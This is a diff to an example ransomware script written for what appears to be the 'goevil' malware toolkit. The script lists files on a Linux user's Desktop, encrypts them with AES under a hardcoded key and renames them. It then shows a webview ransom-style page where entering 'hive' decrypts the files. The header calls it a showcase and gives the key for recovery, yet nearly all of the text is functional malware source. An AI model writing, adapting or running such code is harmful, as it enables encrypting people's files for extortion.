@@ -1,12 +1,17 @@
-@ Warning: This is an example ransomware, in the case of accidental encryption know the following @
+@ Warning: This is an example ransomware to showcase what goevil can do @
+
+@ In the case of accidental encryption know the following @
 @ 1. The encryption method is AES @
 @ 2. The key length is 16 bytes @
 @ 3. The encryption key used is hiveXXXXXXXXXXXX @
-@ 4. The ransomware only targets the current running users directory @
+@ 4. The ransomware only targets the current running user's Desktop directory @
+@ 5. The source code is not obfuscated @
+@ 6. The ransomware is built for linux, but can be rewritten for windows @ 
 
 use webview
 use system
 use crypto
+use time
 
 [
     version 2.0
@@ -17,12 +22,13 @@ use crypto
 ]
 
 c decrypt_files {
+    crypto::clean_targets() @ Remove all our prevously gathered targets @
     crypto::set_extension(".cleared")
     crypto::set_aes_key("hiveXXXXXXXXXXXX")
-    crypto::set_method("aes")
-
-    system::list_dir("/home/€666€/Desktop") @ Puts the result into €1€ @
-    foreach("€1€"):
+    crypto::set_method("aes")    
+    
+    system::list_dir(${"file", "/home/€666€/Desktop"}$) @ Puts the result into €1€ @
+    foreach("€2€"):
         crypto::add_target("€13€") @ Add each file to our target list @
     end foreach
 
@@ -34,9 +40,8 @@ b encrypt_files {
     crypto::set_aes_key("hiveXXXXXXXXXXXX")
     crypto::set_method("aes")
 
-    system::list_dir("/home/€666€/Desktop") @ Puts the result into €1€ @
+    system::list_dir(${"file", "/home/€666€/Desktop"}$) @ Puts the result into €1€ @
     foreach("€1€"):
-        system::outln("€13€")
         crypto::add_target("€13€") @ Add each file to our target list @
     end foreach
 
@@ -46,9 +51,9 @@ b encrypt_files {
 l webview_run {
     webview::bind(${"decrypt", "decrypt_files"}$)
 
-    webview::js("function checking() { var input = document.getElementById('in').value; if (input === 'hive'){decrypt();}}")
+    webview::js("function checking() { var input = document.getElementById('in').value; if (input === 'hive'){decrypt(); window.alert('Successfully decrypted files')}else{window.alert('Enter hive into the text box')}}")
 
-    webview::css("body{ background-image:url('<final url>'); background-repeat: no-repeat;  background-size: cover; background-position: center center; }")
+    webview::css("body{ background-image:url('https://raw.githubusercontent.com/TeamPhoneix/go-evil/v2/examples/ransomware/Alien/background.jpg'); background-repeat: no-repeat;  background-size: cover; background-position: center center; }")
     webview::css("label{color: #555;}")
 
     webview::html("<label for='in'>Input</label>")
